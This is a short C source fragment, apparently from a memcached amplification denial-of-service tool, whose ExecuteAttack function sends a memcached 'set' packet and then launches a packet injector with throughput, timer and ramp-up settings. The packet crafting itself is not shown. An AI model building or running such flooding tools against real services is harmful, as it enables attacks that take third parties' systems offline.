#include "manager.h"
#include "executor.h"
#include "common/common.h"
#include "netuno/netuno.h"


#define ERROR_MEMCACHED -1
#define STRIKE 0

int ExecuteAttack( AttackPlan * atkData )
{
  if( SendPacket(atkData->setPacket) < 0 )
  {
    ELOG(ERROR_MEMCACHED, "error memcached\n");
  }
   
  StartNetunoInjector( atkData->getPacket, atkData->initialThroughput, atkData->timer, atkData->incrementAttack);
  
  //CloseSocket(sock);
  return STRIKE;
}

